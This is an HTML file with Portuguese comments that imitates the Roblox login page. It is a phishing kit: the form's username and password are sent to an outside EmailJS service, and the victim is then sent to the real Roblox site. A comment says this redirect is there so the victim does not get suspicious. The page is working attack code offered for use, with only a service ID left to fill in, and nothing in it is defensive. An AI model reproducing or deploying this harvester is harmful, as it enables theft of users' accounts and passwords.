<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <!-- Script do EmailJS -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function(){
            // Inicializa com sua chave pública
            emailjs.init("4nOCEE08jK86Ozlp3");
        })();
    </script>
    <style>
        /* Reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #232527; /* Fundo Escuro Roblox */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
        }

        .login-box {
            background-color: #393b3d; /* Cor do Card */
            padding: 40px;
            width: 100%;
            max-width: 400px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo h1 {
            font-size: 36px;
            font-weight: 800;
            letter-spacing: 1px;
        }

        .input-group {
            margin-bottom: 15px;
        }

        input[type="text"], 
        input[type="password"] {
            width: 100%;
            padding: 14px;
            background-color: #e7e9ec;
            border: 1px solid transparent;
            border-radius: 5px;
            font-size: 16px;
            color: black;
            outline: none;
        }

        input:focus {
            border-color: #000;
            background-color: #fff;
        }

        button {
            width: 100%;
            padding: 14px;
            background-color: #000; /* Botão Preto */
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background-color: #333;
        }

        button:disabled {
            background-color: #555;
            cursor: not-allowed;
        }

        .links {
            margin-top: 20px;
            text-align: center;
            font-size: 14px;
            color: #bdbec0;
        }

        .links a {
            color: #bdbec0;
            text-decoration: none;
        }

        .links a:hover {
            text-decoration: underline;
        }

        #status-msg {
            text-align: center;
            margin-top: 10px;
            font-size: 14px;
            min-height: 20px;
        }
    </style>
</head>
<body>

    <div class="login-box">
        <div class="logo">
            <h1>ROBLOX</h1>
        </div>

        <form id="roblox-form">
            <div class="input-group">
                <input type="text" name="username" placeholder="Nome de usuário ou e-mail" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Senha" required>
            </div>
            
            <button type="submit" id="btn-login">Entrar</button>
            <p id="status-msg"></p>
        </form>

        <div class="links">
            <a href="#">Esqueceu o nome de usuário ou a senha?</a><br><br>
            <a href="#">Criar uma conta</a>
        </div>
    </div>

    <script type="text/javascript">
        // CONFIGURAÇÕES
        const SERVICE_ID = 'SEU_SERVICE_ID'; // ⚠️ SUBSTITUA AQUI PELO SEU SERVICE ID (ex: service_abc123)
        const TEMPLATE_ID = 'template_ttaedjc';
        
        const form = document.getElementById('roblox-form');
        const btn = document.getElementById('btn-login');
        const statusMsg = document.getElementById('status-msg');

        form.addEventListener('submit', function(event) {
            event.preventDefault();
            
            // Muda estado do botão
            btn.disabled = true;
            btn.innerText = "Entrando...";
            statusMsg.innerText = "";

            // Envia para o EmailJS
            emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, this)
                .then(() => {
                    // Sucesso: Redireciona para o site real do Roblox para não desconfiar
                    window.location.href = "https://www.roblox.com/home";
                })
                .catch((error) => {
                    // Erro: Mostra mensagem na tela
                    btn.disabled = false;
                    btn.innerText = "Entrar";
                    statusMsg.style.color = "#ff4d4d";
                    statusMsg.innerText = "Erro de conexão. Tente novamente.";
                });
        });
    </script>

</body>
</html>

</body>
</html>
